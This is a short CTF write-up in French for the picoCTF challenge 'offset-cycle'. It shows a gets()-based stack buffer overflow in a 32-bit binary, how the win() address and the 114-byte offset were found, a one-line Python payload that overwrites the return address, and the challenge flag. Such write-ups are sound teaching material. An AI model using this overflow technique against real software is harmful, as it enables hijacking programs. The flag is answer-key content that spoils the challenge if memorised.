# Writeup : offset-cycle (picoCTF)

## 1. Contexte
Il s'agit d'un challenge de "Binary Exploitation" où un binaire et son code source sont générés dynamiquement sur un serveur distant. On dispose de 120 secondes pour exploiter le binaire avant qu'il ne soit supprimé.

## 2. Analyse du Code Source
Le code source `40.c` révèle une vulnérabilité classique de dépassement de tampon :

```c
void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("CodeBank/flag.txt","r");
  // ... affiche le flag ...
}

void vuln(){
  char buf[102];
  gets(buf); // VULNÉRABILITÉ
}
```

La fonction `gets()` n'effectue aucun contrôle de taille, permettant ainsi d'écraser l'adresse de retour sur la pile pour rediriger l'exécution vers la fonction `win()`.

## 3. Identification des Paramètres
- **Architecture :** ELF 32-bit (Intel 80386).
- **Adresse de `win` :** Trouvée via `nm 40 | grep win` -> `0x080491f6`.
- **Offset :** Trouvé en envoyant un pattern cyclique et en observant l'adresse de retour écrasée affichée par le programme (helper `get_return_address`). L'adresse `0x61656261` (little-endian) correspond à l'offset **114**.

## 4. Exploitation
Le payload est construit avec 114 octets de padding suivis de l'adresse de `win` envoyée via un pipe :

```bash
# Commande d'exploitation
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*114 + b"\xf6\x91\x04\x08")' | ./40
```

Le programme saute alors vers la fonction `win()` et affiche le flag.

**Flag :** `picoCTF{u_Us3d_pwNt00L5_93ade194}`
